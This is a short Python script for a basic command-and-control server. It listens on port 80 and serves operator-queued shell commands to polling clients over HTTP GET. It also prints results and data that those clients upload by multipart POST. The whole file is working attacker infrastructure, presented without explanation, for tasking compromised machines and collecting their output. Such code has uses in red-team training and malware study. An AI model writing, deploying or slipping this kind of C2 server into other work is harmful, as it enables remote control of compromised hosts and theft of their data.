#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import multipart
from io import BytesIO
import threading

import prompt_toolkit
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout

port = 80
address = "0.0.0.0"
tasks = []
sep = "\n"

class C2(BaseHTTPRequestHandler):
    # Helper function to send data back to client
    def reply(self, data):
        self.send_response(200)
        self.send_header('Content-Length', len(data))
        self.end_headers()
        self.wfile.write(data)

    # Handle HTTP GET requests
    def do_GET(self):
        global tasks
        client = self.client_address[0]
        num_cmds = len(tasks)
        cmd_str = sep.join(tasks).encode()
        self.reply(cmd_str)
        if num_cmds > 0:
            print("{} Commands sent to {}".format(num_cmds, client))
        tasks = []

    # Handle HTTP POST requests
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length)
            stream = BytesIO(body)
            boundary = stream.readline()
            boundary = boundary.strip(b"\r\n")[2:]
            stream.seek(0)
            parser = multipart.MultipartParser(stream, boundary)
             
            for part in parser:
                res = part.file.read().decode()
                if res:
                    print(res)
        except Exception as e:
            print(e)

    # Stop log messages from printing to the screen
    def log_message(self, format, *args):
        return

httpd = HTTPServer((address, port), C2)
srv_thread = threading.Thread(target=httpd.serve_forever, args=())
srv_thread.daemon = True
srv_thread.start()
print("HTTP Server running on port {}".format(port))

session = PromptSession()
while True:
    try:
        with patch_stdout():
            cmd = session.prompt(">")
            if cmd:
                tasks.append(cmd)
                print("Command queued")
    except Exception as e:
        print(e)
